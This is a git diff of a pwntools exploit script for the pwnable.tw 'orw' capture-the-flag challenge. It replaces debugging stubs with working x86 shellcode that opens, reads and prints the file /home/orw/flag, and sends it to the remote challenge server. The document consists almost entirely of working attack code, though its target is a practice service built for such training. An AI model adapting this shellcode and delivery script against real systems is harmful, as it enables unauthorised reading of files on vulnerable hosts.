@@ -2,13 +2,8 @@
 from pwn import *
 
 context.terminal = ['tmux', 'splitw', '-h']
-shellcode = "j\x05Xhflag1\xc9\x99T[\xcd\x80"
-shellcode = "\xc3"
-#p = remote("chall.pwnable.tw", 10000)
-r_addr = 0x8048556
-p = process("./orw")
-gdb.attach(p, 'b main')
+shellcode = b"j\x05Xhag\x00\x00hw/flhe/orh/hom1\xc9\x99T[\xcd\x80j\x03Xj\x03[h\x00\xa5\x04\x08Yj2Z\xcd\x80j\x04Xj\x01[h\x00\xa5\x04\x08Yj2Z\xcd\x80"
+p = remote("chall.pwnable.tw", 10001)
 p.recv()
-payload = "A"*0x200
-p.send(payload)
+p.sendline(shellcode)
 p.interactive()
